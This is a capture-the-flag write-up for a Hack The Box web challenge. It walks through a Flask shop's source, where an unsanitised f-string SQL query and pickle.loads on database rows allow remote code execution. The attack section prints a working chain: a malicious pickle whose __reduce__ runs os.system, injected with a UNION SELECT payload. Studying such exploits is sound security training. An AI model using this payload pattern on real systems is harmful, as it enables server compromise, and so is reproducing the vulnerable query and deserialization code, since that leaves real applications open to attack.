HTB Challenge

We get a ton of files, all seeming to be setup for a docker container. We also have an active instance of the whole webapp. As typical for the web category.

## Initial Enumeration

First, lets look at the important files. After having a quick look, it seems to be `routes.py` in `application/blueprints`, and `app.py`, `config.py`, `database.py` and `models.py` in `application`.

#### `routes.py`
```python
from flask import Blueprint, render_template
from application.models import shop

web = Blueprint('web', __name__)

@web.route('/')
def index():
    return render_template('index.html', products=shop.all_products())

@web.route('/view/<product_id>')
def product_details(product_id):
    return render_template('item.html', product=shop.select_by_id(product_id))
```

This seems to be very basic, and the only input seems to be `product_details`. it passes it to `shop` in `models.py`. it also calls `render_template`

#### `models.py`
Here we can see two functions, lets focus on one right now.
```python
@staticmethod
def select_by_id(product_id):
	return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
```

This is a plain function string, which does no input checking, and simply replaces product_id with whatever is placed in this function. This is a classic SQLi, where we can inject whatever we want. This seems to be the beginning of the path, but our flag is not in the database. Also, this calls a function `query_db` from `database.py`.

#### `database.py`
```python
def query_db(query, args=(), one=False):
    with app.app.app_context():
        cur = get_db().execute(query, args)
        rv = [dict((cur.description[idx][0], value) \
            for idx, value in enumerate(row)) for row in cur.fetchall()]
        return (next(iter(rv[0].values())) if rv else None) if one else rv
```
This will get the database, and execute the query. Then, it should return the first object it finds. Meaning, if we can get our own pickled object into the database, we can exploit it in multiple ways.

Its also worth mentioning, theres a function that is ran at the beginning of the program.

```python
def migrate_db():
    items = [
        Item('Pickle Shirt', 'Get our new pickle shirt!', '23', '/static/images/pickle_shirt.jpg'),
        Item('Pickle Shirt 2', 'Get our (second) new pickle shirt!', '27', '/static/images/pickle_shirt2.jpg'),
        Item('Dill Pickle Jar', 'Literally just a pickle', '1337', '/static/images/pickle.jpg'),
        Item('Branston Pickle', 'Does this even fit on our store?!?!', '7.30', '/static/images/branston_pickle.jpg'),
        Item("pwned","seriously pwned","13.37","/../flag.txt")
    ]
    
    with open('schema.sql', mode='r') as f:
        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
        get_db().cursor().executescript(f.read().format(*list(shop)))
```

So any object in the database will be a pickle.
#### `app.py`
```python
@app.template_filter('pickle')
def pickle_loads(s):
	return pickle.loads(base64.b64decode(s))
```

This will decode any pickle it is given. it seems to not be used anywhere, but how else would the pickles be decoded?

## Attack

Now we have the plan in place, exploit the SQLi, load our own pickle onto the database, and our pickle will be an item that serves the flag.

Then, create a malicious item to get the flag.
```python
class Item:
    def __reduce__(self):
        return os.system, ("cp flag.txt application/static/flag.txt",)
malitem = Item()
```

Then, pickle and base64 the item.
```python
malpickle = base64.b64encode(pickle.dumps(malitem)).decode()
print(malpickle)
```

From this, we inject the malpickle into the statement with union select. Make sure to urlencode the statement!

```python
sqli = "' UNION SELECT '" + malpickle + "' ; --"

print(urllib.parse.quote(sqli))
```

Give this to `/view/[statement]` and. there is a blank page. good sign. now lets go to `/static/flag.txt`

And that is the flag!

https://www.hackthebox.com/achievement/challenge/158887/395